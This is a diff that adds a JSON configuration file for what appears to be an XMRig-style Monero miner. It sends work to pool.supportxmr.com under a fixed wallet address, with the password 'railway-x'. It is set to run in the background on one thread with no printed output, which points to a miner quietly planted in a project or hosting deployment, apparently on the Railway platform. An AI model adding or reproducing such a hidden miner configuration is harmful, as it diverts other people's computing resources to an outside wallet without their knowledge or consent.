@@ -1,0 +1,21 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "max-threads": 1,
+        "priority": 0,
+        "huge-pages": false
+    },
+    "opencl": false,
+    "cuda": false,
+    "pools": [{
+        "url": "pool.supportxmr.com:3333",
+        "user": "47f9b8NRRTEit9Z9grY8LG3763tQPeujvdxkeUfwaAxeVSyiw5wE33wLFPip2boPjYHiXvTVESHR8HWP8pWA1GiRJp7NL9E",
+        "pass": "railway-x",
+        "keepalive": true,
+        "tls": false
+    }],
+    "print-time": 0,
+    "background": true,
+    "donate-level": 0
+}
